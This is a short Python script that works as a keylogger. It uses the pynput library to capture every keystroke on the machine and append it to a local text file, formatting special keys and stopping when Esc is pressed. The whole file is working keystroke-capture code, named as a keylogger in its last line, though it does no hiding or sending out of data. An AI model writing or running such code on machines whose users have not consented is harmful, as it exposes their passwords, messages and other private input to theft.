import pynput
from pynput.keyboard import Key, Listener

log_file = "key_log.txt"

# Function to write keystrokes to a file
def write_to_file(key):
    with open(log_file, "a") as f:
        key = str(key).replace("'", "")
        if key == "Key.space":
            f.write(" ")
        elif key == "Key.enter":
            f.write("\n")
        elif "Key" in key:
            f.write(f" [{key}] ")
        else:
            f.write(key)

# Function to handle key press events
def on_press(key):
    write_to_file(key)

# Function to handle key release events
def on_release(key):
    if key == Key.esc:
        # Stop listener
        return False

# Set up the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

print("Keylogger has stopped.")

